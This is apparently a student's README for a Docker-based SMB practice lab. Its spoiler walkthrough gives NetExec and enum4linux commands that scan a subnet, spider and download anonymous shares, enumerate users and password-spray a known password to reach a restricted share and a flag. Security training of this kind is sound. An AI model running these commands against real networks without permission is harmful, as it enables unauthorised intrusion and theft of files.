
### Author: Cooper Wiegand
### Directive: CSC840 - Final Presentation

### > [YouTube Walkthough](https://www.youtube.com/watch?v=xxxxxxxxx)

# SMB Playground: Featuring NetExec & enum4linux

### Introduction
In the field of cyber operations, it is imperative to not only understand popular protocols and services along with the tools that interface with them but to also have the space needed to hone one's skills. Utilizing a modular docker-based lab that can be rapidly spun up or down without affecting the host system opens the door to exploring many services, misconfigurations, and vulnerabilities.

We will be spinning up a simple lab environment with an attack container and an SMB (Server Message Block) server. SMB is commonly used in enterprise environments for file sharing and the service is a popular target for attackers. The docker-ized attack container comes pre-baked with **NetExec** and **enum4linux** so that one may work their way from a lowly anonymous-user all the way up to a priveledged user accessing restricted files.

### Main Topics
1. **SMB Enumeration**  
Utilizing tools like NetExec and enum4linux, identify misconfigured SMB shares, capture exposed sensitive files, and discover users.

2. **Using Docker for Security Labs**  
"Learning-by-doing" The Docker-based setup illustrates how to create a self-contained, reusable environment for security testing. Add additional vulnerable containers to this "lab" to explore other misconfigurations, vulnerabilities, and tools.

3. **Authentication and Data Recovery**  
Leverage discovered information to construct credentials elevating your access to the SMB server, demonstrating the impact of poor access control policies.

### Final Notes
This exercise demonstrates the importance of securing SMB configurations by enforcing strict access controls, using strong passwords, and disabling unnecessary services like guest access. The modular design of the Docker environment opens the door to further exploration, such as testing advanced tools, vulnerabilities, and attack techniques. Future work could expand on this demonstration by incorporating attacks like SMB relay, lateral movement, or evasion techniques to bypass detection while interacting with SMB services.

### Additional Resources
- [NetExec Wiki](https://www.netexec.wiki/smb-protocol) for SMB
- [enum4linux Cheatsheet](https://highon.coffee/blog/enum4linux-cheat-sheet/)

# Included Files
```
CSC840_Final_Wiegand/
├── attacker/
│   ├── Dockerfile
├── smb1/
│   ├── Dockerfile
│   ├── setup.sh
├── docker-compose.yml
├── README.md
```

# Quick Start

[Linux] Install docker and docker-compose
```bash
# Install Prereqs
sudo apt-get update
sudo apt install -y apt-transport-https ca-certificates curl software-properties-common

# Add Docker's GPG Key and Repo
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# Install Docker
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io

# Install docker-compose
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose

# Start Docker Service
sudo systemctl enable docker
sudo systemctl start docker

# Verify Docker & docker-compose
docker --version
docker-compose --version
```

# Build and Boot

Build/Restart Environment
```
sudo docker-compose down
sudo docker-compose build; sudo docker-compose up -d
```

Drop into attack container
```
docker exec -it attacker /bin/bash
```

# [Walkthrough/Spoilers] Exploring NetExec and enum4linux

### Look through the [NetExec Wiki](https://www.netexec.wiki/smb-protocol) for SMB

Scan for smb servers
```
nxc smb 192.168.1.0/24
```

Scan for anonymous shares and spider results
```
nxc smb 192.168.1.0/24 -u '' -p '' --shares
nxc smb 192.168.1.2 -u '' -p '' -M spider_plus
nxc smb 192.168.1.2 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

Scan to discover publicly exposed users
```
enum4linux 192.168.1.2
```

Use discovered users with password until you find a match
```
nxc smb 192.168.1.2 -u '' -p '' --shares

nxc smb 192.168.1.2 -u 'e76543210' -p 'strongpassword123!' --local-auth --shares
nxc smb 192.168.1.2 -u 'e27481930' -p 'strongpassword123!' --local-auth --shares
nxc smb 192.168.1.2 -u 'e90874321' -p 'strongpassword123!' --local-auth --shares
```

Re-Spider target as a credentialed user
```
nxc smb 192.168.1.2 -u 'e90874321' -p 'strongpassword123!' --local-auth -M spider_plus -o DOWNLOAD_FLAG=True
```

### _Explore the files recovered from the restricted share to find a flag.txt_